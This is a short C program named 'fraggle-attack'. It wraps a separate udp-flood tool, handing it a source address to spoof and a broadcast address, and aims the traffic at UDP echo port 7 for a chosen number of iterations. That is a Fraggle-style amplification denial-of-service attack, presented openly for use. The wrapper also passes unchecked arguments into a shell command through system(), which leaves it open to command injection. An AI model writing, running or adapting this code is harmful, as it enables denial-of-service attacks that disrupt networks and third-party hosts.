#include <stdio.h>
#include <stdlib.h>

// Arguments standarized and checked //
// Respects executable [--source-addr saddr --[remote|broadcast]-addr raddr --source-port sport [--remote-port rport] [--n N]] //

int main(int argc,char* argv[]){
	if(argc!=9){ fprintf(stdout,"\nUsage: fraggle-attack --source-addr saddr --broadcast-addr raddr --source-port rport --n N\n"); exit(0); }
	char* source_address = argv[2];
	char* broadcast_address = argv[4];
	char* source_port    = argv[6];
	unsigned int iter    = atoi(argv[8]);
	char* cli = (char*)malloc(1000);
	sprintf(cli,"./udp-flood --source-addr %s --remote-addr %s --source-port %s --remote-port 7 --n %d",source_address, \
			broadcast_address,source_port,iter);
	system(cli);
	free(cli);
	return 0;
}
